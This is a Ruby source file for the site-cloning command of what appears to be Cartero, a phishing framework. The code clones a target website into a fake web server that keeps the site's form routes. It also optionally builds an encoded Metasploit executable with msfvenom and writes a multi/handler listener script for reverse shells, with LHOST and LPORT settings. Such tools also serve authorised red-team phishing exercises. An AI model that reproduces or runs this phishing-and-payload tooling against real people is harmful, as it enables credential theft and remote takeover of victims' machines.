module Cartero
module Commands
class Cloner < Cartero::Command
	def initialize
		super do |opts|
			opts.on("-U", "--url [URL_PATH]", String,
    		"Full Path of site to clone") do |url|
      	@options.url = url
    	end

    	opts.on("-W", "--webserver [SERVER_NAME]", String,
    		"Sets WebServer name to use") do |ws|
      	@options.webserver = ws
    	end

    	opts.on("-p", "--path [PATH]", String,
    		"Sets path to save webserver") do |path|
      	@options.path = path
    	end

    	opts.on("--useragent [UA_STRING]", String,
    		"Sets user agent for cloning") do |payload|
      	@options.useragent = payload
    	end

    	opts.on("--wget", "Use wget to clone url") do
    		@options.wget = true
  		end

    	opts.on("--apache", "Generate Apache Proxy conf") do
    		@options.apache = true
  		end

  		opts.on("--msfvenom", "Sets flag to use msfvenom command") do
    		@options.msfvenom = true
  		end

			opts.separator ""
			opts.separator "Payload options:"
			opts.on("-P", "--payload [PAYLOAD_PATH]", String,
				"Sets payload path") do |payload|
				@options.payload = payload
			end

			opts.on("-m","--msfpayload [MSF_PAYLOAD]", String,
				"Sets msfpayload type") do |payload|
				@options.msfpayload = payload
			end

			opts.on("-a","--msfarch [ARCH]", String,
				"Sets msfpayload architecture") do |arch|
				@options.msfarch = arch
			end

			opts.on("-o, ""--msfoptions [MSF_OPTIONS]", String,
				"Sets options for --msfpayload") do |opt|
				@options.msfoptions = opt
			end

			opts.on("-n","--msfname [NAME]", String,
				"Sets msf payload name") do |name|
				@options.msfname = name
			end

    end
	end
	attr_accessor :url
	attr_accessor :url_route
	attr_accessor :path
	attr_accessor :webserver
	attr_accessor :forms_routes
	attr_accessor :payload
	attr_accessor :wget
	attr_accessor :apache
	attr_accessor :useragent
	attr_accessor :domain_info
	attr_accessor :msfpayload
	attr_accessor :msfvenom

	def setup
		require 'erb'
		require 'uri'

		if @options.url.nil?
			raise StandardError, "A url [--url] must be provided"
		end

		if @options.webserver.nil?
			raise StandardError, "A WebServer name [--webserver] must be provided"
		end

		if @options.path.nil?
			puts "Saving WebServer to [ #{Cartero::TemplatesWebServerDir} ]"
			@options.path = Cartero::TemplatesWebServerDir
		end

		if ( @options.msfpayload.nil? && ( !@options.msfoptions.nil? || !@options.msfname.nil? || !@options.msfarch.nil? ))
			raise StandardError, "Option requires a --msfpayload"
		elsif ( !@options.msfpayload.nil? )
			@msfpayload = true
		end
		@msfvenom		= @options.msfvenom
		@url 				= @options.url
		@url_route 	= URI.parse(@options.url).path
		@path 			= File.expand_path @options.path
		@webserver 	= @options.webserver
		@payload 		= @options.payload || path + "/"  +  webserver.underscore + "/payload/" + @options.msfname
		@wget 			= @options.wget
		@apache 		= @options.apache
		@useragent 	= @options.useragent || "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
	end


	def run
		puts "Cloning URL #{@url}"
		create_structure
		clone
		if msfvenom
			payload_name = path + "/"  +  webserver.underscore + "/payload/" + (@options.msfname || "download")
			handler_name = path + "/"  +  webserver.underscore + "/payload/handler.rc"
			
			cmd = "msfvenom -p #{@options.msfpayload} " + 
					  "-f exe -e -i 3 -s 480 " + 
					  "#{"--arch #{@options.msfarch} " if @options.msfarch}" + 
					  @options.msfoptions + " > #{payload_name}" 
			
			puts "Generating MSF payload using msfvenom directly"
			puts "\t#{cmd}"
			system(cmd)
			puts "Payload saved as #{payload_name}"
			puts "MSF handler script saved as #{handler_name}"
			ops = payload_options(@options.msfoptions)
			File.open(handler_name, "w") do |x|
				x << "use exploit/multi/handler\n" +
             "set PAYLOAD #{@options.payload}\n" +
             "set LHOST #{ops["LHOST"]}\n" +
             "set LPORT #{ops["LPORT"] || "4444"}\n" +
             "set ExitOnSession false\n" +
             "exploit -j\n"
      end
		elsif msfpayload
			puts "Generating MSF payload #{@options.msfpayload} with options #{@options.msfoptions}"
			require 'cartero/payloads'
			@msfpayload = Cartero::Payloads.new({ :payload=> @options.msfpayload , :encoder=>"x86/shikata_ga_nai", 
																						:format=>"exe", :iterations=>3, :space=>480, :arch => @options.msfarch })
			@msfpayload.payload_options(@options.msfoptions)
			msfpayload.generate
			payload_name = path + "/"  +  webserver.underscore + "/payload/" + (@options.msfname || "download")
			puts "Payload saved as #{payload_name}"
			msfpayload.output(File.open(payload_name, "w"))
			handler_name = path + "/"  +  webserver.underscore + "/payload/handler.rc"
			puts "MSF handler script saved as #{handler_name}"
			File.open(handler_name, "w") {|x| x << msfpayload.generate_listener_script }
		end
		if apache
			puts "Generating Apache mod_proxy config file"
			create_apache_conf
		end
	end

	def create_structure
		name = webserver.underscore
		Dir.mkdir path + "/"  + name unless File.directory?(path + "/"  + name)
		Dir.mkdir path + "/"  + name + "/static" unless File.directory? path + "/"  + name + "/static"
		Dir.mkdir path + "/"  + name + "/views" unless File.directory? path + "/"  + name + "/views"
		if msfpayload
			Dir.mkdir path + "/"  + name + "/payload" unless File.directory? path + "/"  + name + "/payload"
		end
	end

	def clone
		require 'mechanize'

		mechanize = Mechanize.new
		mechanize.user_agent = useragent
		page = mechanize.get(url)

		forms_routes = page.forms.map {|x| [x.method.downcase , x.action] }

		@domain_info = {
			:url 					=> url,
			:url_route    => url_route,
			:path 				=> path,
			:webserver 		=> webserver,
			:forms_routes => forms_routes,
			:payload 			=> payload
		}

		ws = File.new(@options.path + "/"  + webserver.underscore + "/" + webserver.underscore + ".rb", "w")
		ws << ERB.new(File.read(File.dirname(__FILE__) + "/../../../templates/webserver/template.rb.erb")).result(domain_info.get_binding)
		ws.close
		if wget
			system("wget --no-check-certificate -O \"#{@options.path + "/" + webserver.underscore + "/views/index.erb"}\" -c -k  \"#{url}\"")
		else
			create_index(page)
		end
	end


   def payload_options(args)
    ds = {}
    if args
      args.split(" ").each do |x|
        k,v = x.split('=', 2)
        ds[k.upcase] = v.to_s
      end
      if @options.msfpayload.to_s =~ /[\_\/]reverse/ and ds['LHOST'].nil?
        ds['LHOST'] = local_ip
      end
    end
    ds
  end

	def local_ip
		require 'socket'
	  orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	 
	  UDPSocket.open do |s|
	    s.connect '64.233.187.99', 1
	    s.addr.last
	  end
	ensure
	  Socket.do_not_reverse_lookup = orig
	end

	def create_index(page)
		zurl = URI.parse(url)

		page.search("//*/@href").each do |href|
			link = URI.parse(href.value)
			if link.host.nil? && link.scheme != "mailto"
				link.host = zurl.host
				link.scheme = zurl.scheme
				href.value = link.to_s
			end
		end

		page.search("//*/@src").each do |src|
			link = URI.parse(src.value)
			if link.host.nil? && link.scheme != "mailto"
				link.host = zurl.host
				link.scheme = zurl.scheme
				src.value = link.to_s
			end
		end

		f = File.new(@options.path + "/" + webserver.underscore + "/views/index.erb", "w")
		f << page.parser.to_s
		f.close
	end

	def create_apache_conf
		ws = File.new(@options.path + "/"  + webserver.underscore + "/" + webserver.underscore + "_apache_module_.conf", "w")
		ws << ERB.new(File.read(File.dirname(__FILE__) + "/../../../templates/apache/apache_proxy.conf.erb")).result(domain_info.get_binding)
		ws.close
	end

end
end
end
